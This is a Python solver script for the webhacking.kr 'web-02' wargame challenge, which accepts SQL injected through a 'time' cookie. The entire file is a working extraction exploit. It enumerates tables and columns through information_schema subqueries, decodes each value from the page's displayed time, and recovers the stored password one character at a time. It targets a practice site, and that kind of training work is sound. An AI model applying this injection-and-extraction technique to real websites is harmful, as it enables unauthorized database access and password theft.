import re

import requests
from requests import Response


def set_time_cookie(query):
    return {"time": query}


def request_with_cookies(cookies):
    url = "https://webhacking.kr/challenge/web-02/"
    response = requests.get(url, cookies=cookies)
    return response


def select_time_to_sec(response: Response):
    search = re.search(r"09:(\d+):(\d+)", response.text)
    return int(search.groups()[0]) * 60 + int(search.groups()[1])


if __name__ == '__main__':
    cookies = set_time_cookie("(select count(table_name) from information_schema.tables where table_schema=database())")
    response = request_with_cookies(cookies)
    table_cnt = select_time_to_sec(response)

    print(f"{table_cnt} table detected!")

    cookies = set_time_cookie(
        "(select length(table_name) from information_schema.tables where table_schema=database() limit 0, 1)"
    )
    response = request_with_cookies(cookies)
    table_name_len = select_time_to_sec(response)

    print(f"Table name length is {table_name_len}.")

    table_name = ""
    for i in range(table_name_len):
        cookies = set_time_cookie(
            f"(select ascii(substr(table_name, {i + 1}, 1)) from information_schema.tables where table_schema=database() limit 0, 1)"
        )
        response = request_with_cookies(cookies)
        table_name += chr(select_time_to_sec(response))
    print(f"Table name is {table_name}.")

    cookies = set_time_cookie(
        f"(select count(column_name) from information_schema.columns where table_name='{table_name}')"
    )
    response = request_with_cookies(cookies)
    column_cnt = select_time_to_sec(response)
    print(f"{table_name} has {column_cnt} column.")

    cookies = set_time_cookie(
        f"(select length(column_name) from information_schema.columns where table_name='{table_name}')"
    )
    response = request_with_cookies(cookies)
    column_length = select_time_to_sec(response)
    print(f"Column length is {column_length}.")

    column_name = ""
    for i in range(column_length):
        cookies = set_time_cookie(
            f"(select ascii(substr(column_name, {i + 1}, 1)) from information_schema.columns where table_name='{table_name}')"
        )
        response = request_with_cookies(cookies)
        column_name += chr(select_time_to_sec(response))
    print(f"Column name is {column_name}.")

    cookies = set_time_cookie(
        f"(select length(pw) from {table_name}.)"
    )
    response = request_with_cookies(cookies)
    password_length = select_time_to_sec(response)

    print(f"Password length is {password_length}.")

    password = ""
    for i in range(password_length):
        cookies = set_time_cookie(
            f"(select ascii(substr(pw, {i + 1}, 1)) from {table_name})"
        )
        response = request_with_cookies(cookies)
        password += chr(select_time_to_sec(response))
    print(f"Password is {password}!")
